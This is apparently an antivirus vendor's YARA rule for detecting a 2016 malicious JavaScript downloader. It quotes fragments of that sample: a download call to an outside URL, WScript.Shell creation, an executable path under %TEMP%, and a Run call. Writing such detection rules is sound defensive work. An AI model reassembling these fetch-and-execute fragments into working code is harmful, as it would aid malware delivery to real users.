rule sig_20160330_bdf6183b315edc1827f791dfc67a984b {
  meta:
    description = "datamaliciousorder - file 20160330_bdf6183b315edc1827f791dfc67a984b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "05b6a0b7ffa98ce8be4738f6b550834329fe9b974aaab1ba6ea5dcc09e2519d2"

  strings:
    $s1  = "MX[XC](\"GET\", \"http://aaacollectionsjewelry.com/x9djsa\", false);" fullword ascii
    $s2  = "function P(EN, T){EA = EA * 1; return EN - T;};" fullword ascii
    $s3  = "var L = function G() {return WScript[M0](\"WScript\"+\".Shell\");}(), A = 11;" fullword ascii
    $s4  = "if (MX[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SC(){return WZ + \"\";};" fullword ascii
    $s6  = "function M() {return L[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"f1z6uXlS.ex\" + \"e\";};" fullword ascii
    $s7  = "function F(PR){L[\"Run\"](PR, EA, EA);};" fullword ascii
    $s8  = "function C() {return ((NH == true) && (NH == ZX)) ? 1 : EA;};" fullword ascii
    $s9  = "function I(){return 22;};" fullword ascii
    $s10 = "}while (E);" fullword ascii
    $s11 = "function FJ()" fullword ascii
    $s12 = "return P(JR, JY);" fullword ascii
    $s13 = "function G0(){return M0;};" fullword ascii
    $s14 = "function PJ(I0) {var U = (1, 2, 3, 4, 5, I0); return U;};" fullword ascii
    $s15 = "var R0 = new this[\"Date\"]();" fullword ascii
    $s16 = "var NH = false;" fullword ascii
    $s17 = "ZX = true; " fullword ascii
    $s18 = "NH = true; " fullword ascii
    $s19 = "var ZX = false;" fullword ascii
    $s20 = "var WW = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}